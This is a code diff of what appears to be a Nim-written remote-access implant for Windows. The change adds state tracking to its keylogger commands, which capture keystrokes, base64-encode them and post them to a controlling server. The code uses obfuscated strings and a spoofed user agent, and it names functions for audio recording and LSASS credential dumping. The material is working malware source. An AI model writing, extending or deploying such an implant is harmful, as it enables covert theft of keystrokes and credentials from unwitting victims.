@@ -47,7 +47,7 @@ proc is_elevated(): string
 
 # Globals
 let client = newHttpClient(userAgent=get_windows_agent_id())
-
+var keylog_on: bool
 
 #########################
 ### Command executors ###
@@ -232,28 +232,48 @@ proc wrap_record_audio(record_time: int): bool =
 
 
 proc wrap_keylog_start(): bool =
-    keylog_start()
-    var data = {
-        protectString("status"): protectString("keylogger started in a new thread")
-    }.toOrderedTable()
+    var data: OrderedTable[system.string, system.string]
+    if keylog_on:
+        data = {
+            protectString("status"): protectString("keylogger is already on"),
+        }.toOrderedTable()
+    else:
+        keylog_start()
+        keylog_on = true
+        data = {
+            protectString("status"): protectString("keylogger started in a new thread")
+        }.toOrderedTable()
     return post_data(client, protectString("keylog-start") , $data)
 
 
 proc wrap_keylog_dump(): bool = 
-    var klout = keylog_dump()
-    var data = {
-        protectString("keystrokes_base64"): encode_64(klout, is_bin=true)
-    }.toOrderedTable()
+    var data: OrderedTable[system.string, system.string]
+    if not keylog_on:
+        data = {
+            protectString("status"): protectString("keylogger is off"),
+        }.toOrderedTable()
+    else:
+        var klout = keylog_dump()
+        data = {
+            protectString("keystrokes_base64"): encode_64(klout, is_bin=true)
+        }.toOrderedTable()
     return post_data(client, protectString("keylog-dump") , $data)
 
 
 proc wrap_keylog_stop(): bool = 
-    var klout = keylog_stop()
-    var data = {
-        protectString("status"): protectString("keylogger stopped"),
-        protectString("keystrokes_base64"): encode_64(klout, is_bin=true)
-    }.toOrderedTable()
-    return post_data(client, protectString("keylog-stop") , $data)
+    var data: OrderedTable[system.string, system.string]
+    if not keylog_on:
+        data = {
+            protectString("status"): protectString("keylogger is already off"),
+        }.toOrderedTable()
+    else:
+        var klout = keylog_stop()
+        keylog_on = false
+        data = {
+            protectString("keystrokes_base64"): encode_64(klout, is_bin=true),
+            protectString("status"): protectString("keylogger stopped")
+        }.toOrderedTable()
+    return post_data(client, protectString("keylog-stop"), $data)
 
 
 proc dump_lsass(dump_method: string): bool = 
